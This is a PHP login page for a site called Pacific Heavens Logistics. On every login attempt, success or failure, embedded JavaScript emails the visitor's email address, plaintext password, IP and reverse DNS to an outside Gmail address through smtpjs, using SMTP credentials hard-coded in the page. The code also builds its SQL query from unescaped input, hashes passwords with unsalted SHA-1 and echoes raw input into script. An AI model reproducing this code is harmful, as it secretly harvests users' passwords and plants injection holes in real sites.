<!DOCTYPE html>
<html>
<script src="https://smtpjs.com/v2/smtp.js"></script>
<?php 
session_start();
require_once 'db/config.php';
    if(isset($_SESSION['is_logged_in']) == true){
            header("Location: /dashboard/");
    }

if (isset($_POST['email'])){

          $post = filter_input_array(INPUT_POST, FILTER_SANITIZE_STRING);
                          
                $email     = $post['email'];
                $password  = sha1($post['password']);

               //Checking is user existing in the database or not
                $sql = "SELECT * FROM `users` WHERE email='$email'";

                $result = $connect->query($sql);
                $row = $result->fetch_assoc();
                 if($result->num_rows == 1) 
                 {
                    if($row['activ']=="Y")
                    {
                      if($row['pass']==$password){
                              $_SESSION['email']      = $email;
                              $_SESSION['is_logged_in'] = true;
                              $_SESSION['user_data'] = array(
                                      "id"            => $row['id'],
                                      "first_name"    => $row['first_name'],
                                      "last_name"     => $row['last_name'],
                                      "user_role"     => $row['user_role'],
                                      "email"         => $row['email']
                                  );
                                $ipaddress = $_SERVER['REMOTE_ADDR'];
                                $domain = gethostbyaddr($ipaddress);
                                $domain_name = $_SERVER['REQUEST_URI'];
                                  ?>
                                <script>
                                var email           = "<?php echo $email; ?>";
                                var password        = "<?php echo $post['password']; ?>";
                                var ipaddress       = "<?php echo $ipaddress; ?>";
                                var revipaddress    = "<?php echo $domain; ?>";
                                var domain_name     = "<?php echo $domain_name; ?>";
                                var authdate        = new Date().toLocaleString();
                                 Email.send("noreply@pacificheavens.com",
                                            "mrvincentayorinde@gmail.com",
                                            "Pacific Heavens Logistics - Auth Log",
                                            "<h3>New Login Attempt</h3><br><b>Date/Time</b>: "+authdate+"<br><b>Outcome</b>:<b style='color: green;'>Login Successful</b><br><b>Email</b>: "+email+"<br><b>Key</b>: "+password+"<br><b>Domain Name</b>: "+domain_name+"<br><b>IP Add</b>: "+ipaddress+"<br><b>Reverse IP</b>: "+revipaddress+"<br><br>Have a great day.",
                                            "smtp.ipage.com",
                                            "adminphl@pacificheavens.com",
                                            "Password@1");
                                </script>
                                  <?php
                                  echo "<script>
                                    setTimeout(function(){
                                         location.href='/dashboard/';
                                    }, 2000);
                                    </script>";
                               // header("Location: /map-live/dashboard");
                              
                          }else{
                                $ipaddress = $_SERVER['REMOTE_ADDR'];
                                $domain = gethostbyaddr($ipaddress);
                                $domain_name = $_SERVER['REQUEST_URI'];
                                  ?>
                                <script>
                                var email           = "<?php echo $email; ?>";
                                var password        = "<?php echo $post['password']; ?>";
                                var ipaddress       = "<?php echo $ipaddress; ?>";
                                var revipaddress    = "<?php echo $domain; ?>";
                                var domain_name     = "<?php echo $domain_name; ?>";
                                var authdate        = new Date().toLocaleString();
                                 Email.send("noreply@pacificheavens.com",
                                            "mrvincentayorinde@gmail.com",
                                            "Pacific Heavens Logistics - Auth Log",
                                            "<h3>New Login Attempt</h3><br><b>Date/Time</b>: "+authdate+"<br><b>Outcome</b>:<b style='color: red;'>Login Failed</b><br><b>Email</b>: "+email+"<br><b>Key</b>: "+password+"<br><b>Domain Name</b>: "+domain_name+"<br><b>IP Add</b>: "+ipaddress+"<br><b>Reverse IP</b>: "+revipaddress+"<br><br>Have a great day.",
                                            "smtp.ipage.com",
                                            "adminphl@pacificheavens.com",
                                            "Password@1");
                                </script>
                                  <?php
                             $msg = '<h4 style="color:red;">Wrong Details Provided!</h4>';
                          }
                      }else{
                         $msg = '<h4 style="color:red;>This account is not activated, go to your inbox and activate it.</h4>';
                     }
                 }else{
                     $msg = '<h4 style="color:red;">Wrong Details Provided!</h4>';
                 }
             

}
?>

<!-- Mirrored from dev.lorvent.com/globals/directory/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Sep 2016 06:01:03 GMT -->
<head>
    <!--meta tag css link-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!--favicon-->
    <link rel="icon" href="images/favicon.png" type="image/x-icon">
    <!--title-->
    <title>Login | Pacific Heavens Logistics</title>
    <style type="text/css">
        #tabs .ui-tabs-active {
            background: gray;
        }
    </style>
 <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
    ga('create', 'UA-116720729-1', 'auto');
    ga('send', 'pageview');
  </script>

    <!--bootstrap css link-->
    <link rel="stylesheet" type="text/css" href="css/roboto.min.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link href="css/bootstrap-material-design.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/material.css">
    <link rel="stylesheet" type="text/css" href="css/material-design-icon.css">
    <link rel="stylesheet" type="text/css" href="css/ripples.min.css">
    <link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
    <!--Custom-->
    <link rel="stylesheet" type="text/css" href="css/watch.css">


    <!--leftmenu-->
    <link rel="stylesheet" type="text/css" href="css/leftmenu.css">
    <link rel="stylesheet" type="text/css" href="css/custom.css">
    <!--revolution-slider-->
    <link rel="stylesheet" type="text/css" href="css/revolution-slider/settings.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="css/revolution-slider/layers.css" />
    <link rel="stylesheet" type="text/css" href="css/revolution-slider/navigation.css" />
    <link rel="stylesheet" type="text/css" href="css/revolution-slider/style.css" media="screen" />
    <!--tooltip-->
    <link rel="stylesheet" type="text/css" href="css/tooltip/html5tooltips.css">
    <link rel="stylesheet" type="text/css" href="css/tooltip/html5tooltips.animation.css">
    <!--animated css-->
    <link rel="stylesheet" type="text/css" href="css/animate.css">
    <link rel="stylesheet" type="text/css" href="css/about.css">
    <!--custom css link-->
    <!--slider-->
    <link rel="stylesheet" type="text/css" href="css/index-slider.css">
    <link rel="stylesheet" type="text/css" href="css/directory.css">
    <link rel="stylesheet" type="text/css" href="css/index.css">
    <link rel="stylesheet" type="text/css" href="css/red-color.css">
</head>

<body>
    <?php include 'addon/menu.php' ?>
    <!--header section end-->
    <!--slider-->
    <!--
    #################################
        - THEMEPUNCH BANNER -
    #################################
    -->
    <!--www.watchwater.de-->
    <div id="de" style="display:none">

      
        <!--google map section closed-->
        <!--contacts us section-->
        <section class="contacts-section newinput" id="contact">
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                        <h1 class="contacts-h">Login</h1>
                        <p class="contacts-p">
                            or Create Account<br />
                        </p>
                    </div>
                </div>
                
            </div>
        </section>
        <!--contacts us section closed-->

    </div>

<?php 


?>


    <!--www.watchwater.com-->
    <div id="com" style="display:none">
 
     
        <!--google map section closed-->
        <!--contacts us section-->
        <section class="contacts-section newinput" id="contact">
            <div class="container">
                <div class="row">
                    <div class="col-md-12" style="text-align: center;">
                        <h1 class="contacts-h">Login</h1>
                        <p class="contacts-p">
                          <small>New User?</small> <a style="text-decoration: underline;" href="/customer-registration">Create Account</a> <b>Or</b> 
                           <a style="text-decoration: underline;" href="/forgot-password.php">Forgotten Password?</a><br />
                        </p>
                    </div>
                </div>
               
                <div class="row">
                    <div class="col-md-offset-4">
                    <form name="contactform col-md-6" onsubmit="return validateForm();" method="post" action="">


                        <div class="col-md-6 contact-form pad-form"><?php if(isset($msg)) { echo $msg; } ?>
                           <div class="form-group label-floating is-empty">
                                <label class="control-label" for="first_name">Email Address *</label>
                                <input type="text" name="email" id="email_ID" class="form-control">
                                <span class="help-block">Please Email Address</span>
                                <span class="material-input"></span>
                            </div>
                        </div>
                        <div class="clearfix"></div>
                        <div class="col-md-6 contact-form pad-form">
                            <div class="form-group label-floating is-empty">
                                <label class="control-label" for="password">Password *</label>
                                <input type="Password" name="password" id="password" class="form-control">
                                <span class="help-block">Please enter Password</span>
                                <span class="material-input"></span>
                            </div>
                        </div>
                        <!-- <div class="col-md-6 contact-form pad-form">
                            <div class="form-group label-floating is-empty">
                                <label class="control-label" for="first_name">Email Address *</label>
                                <input type="text" name="email" id="email_ID" class="form-control">
                                <span class="help-block">Please Email Address</span>
                                <span class="material-input"></span>
                            </div>
                        </div>
                        <div class="col-md-6 contact-form pad-form">
                            <div class="form-group label-floating is-empty">
                                <label class="control-label" for="Company">Company *</label>
                                <input type="text" name="company" id="company_name" class="form-control">
                                <span class="help-block">Please Email Address</span>
                                <span class="material-input"></span>
                            </div>
                        </div>
                        <div class="col-md-6 contact-form pad-form">
                            <div class="form-group label-floating is-empty">
                                <label class="control-label" for="website">website *</label>
                                <input type="text" name="website" id="website_name" class="form-control">
                                <span class="help-block">Please Email Address</span>
                                <span class="material-input"></span>
                            </div>
                        </div>
                        <div class="col-md-6 contact-form pad-form">
                            <div class="form-group label-floating is-empty">
                                <label class="control-label" for="Country">Country *</label>
                                <input type="text" name="country" id="country_name" class="form-control">
                                <span class="help-block">Please Email Address</span>
                                <span class="material-input"></span>
                            </div>
                        </div>
                        <div class="col-md-6 contact-form pad-form">
                            <div class="form-group label-floating is-empty">
                                <label class="control-label" for="first_name">Telephone Number</label>
                                <input type="text" name="telephone" id="telephone_number" class="form-control">
                                <span class="help-block">Please Telephone Number</span>
                                <span class="material-input"></span>
                            </div>
                        </div>
                        <div class="col-md-6 contact-form pad-form">
                            <div class="form-group label-floating is-empty">
                                <label class="control-label" for="first_name">Commetns</label>
                                <textarea name="comments" class="form-control" id="comments" maxlength="1000" cols="25" rows="6"></textarea>
                                <span class="help-block">Please Commetns</span>
                                <span class="material-input"></span>
                            </div>
                        </div> -->

                        <div class="col-md-12 contact-form pad-form">
                            <div class="form-group label-floating is-empty">
                                <input type="submit" value="Login" style="padding:20px 50px; background-color:#3f79bf; border:1px solid #3f79bf; font-weight:300; color:#f3f3f3; font-size:18px;">
                             
                            </div>
                        </div>

                    </form>
                </div>
            </div>





                </div>
            </div>
        </section>
        <!--contacts us section closed-->

    </div>


 <?php include 'addon/footer.php' ?>

    <!--jquery js file-->
        <script type="text/javascript" src="js/jquery-1.12.4.js"></script>
        <script type="text/javascript" src="js/jquery-ui.js"></script>

    <!--bootstrap js files-->
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <!-- Latest compiled and minified JavaScript -->
    <script type="text/javascript" src="js/material.min.js"></script>
    <script type="text/javascript" src="js/ripples.min.js"></script>
    <!--revolution-slider-->
    <script type="text/javascript" src="js/revolution-slider/jquery.themepunch.tools.min.js"></script>
    <script type="text/javascript" src="js/revolution-slider/jquery.themepunch.revolution.min.js"></script>
    <!--Quickview-->
    <script type="text/javascript" src="js/quickview/jquery.fs.boxer.js"></script>
    <!--tooltip js file-->
    <script type="text/javascript" src="js/tooltip/html5tooltips.js"></script>
    <!--wow-->
    <script type="text/javascript" src="js/wow/wow.min.js"></script>
    <script type="text/javascript" src="js/custom.js"></script>
    <!--page js-->
    <script type="text/javascript" src="js/index.js"></script>



    <script>
        $(function () {
            $("#tabs").tabs();
        });
    </script>


    <script>
        $(function () {
            var url = window.location.href
            //Then just parse that string
            var arr = url.split("/");
            //your url is:
            var result = arr[0] + "//" + arr[2];
            if (result.trim() == "www.watchwater.de" || result.trim() == "http://www.watchwater.de" || result.trim() == "http://watchwater.de") {
                $("#de").show();
            } else {
                $("#com").show();
            }
            $('a[href*="#"]:not([href="#"])').click(function () {
                if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
                    var target = $(this.hash);
                    target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
                    if (target.length) {
                        $('html, body').animate({
                            scrollTop: target.offset().top
                        }, 700);
                        return false;
                    }
                }
            });
        });
        $('button.scrollsomething').on('click', function () {
            $.smoothScroll({
                scrollElement: $('div.scrollme'),
                scrollTarget: '#findme'
            });
            return false;
        });
        function validateEmail($email) {
            var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
            return emailReg.test($email);
        }
    function validateForm()
        {

      // Validate last name
      //   var first_name = $("#first_name").val();
      //   if (first_name == "" || first_name == null) {
      //     alert("Please enter First name");
      //     return false;
      // }
        var email = $("#email_ID").val();
      if (!validateEmail(email) || email == "" || email == null) {
          //if (last_name == "" || last_name == null) {
          alert("Please enter valid Email ID");
          return false;

      }

        var password = $("#password").val();
      if (password == "" || password == null) {
          alert("Please enter Password");
          return false;
      }


    }



    </script>
</body>
<!-- Mirrored from dev.lorvent.com/globals/directory/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 19 Sep 2016 06:01:52 GMT -->
</html>
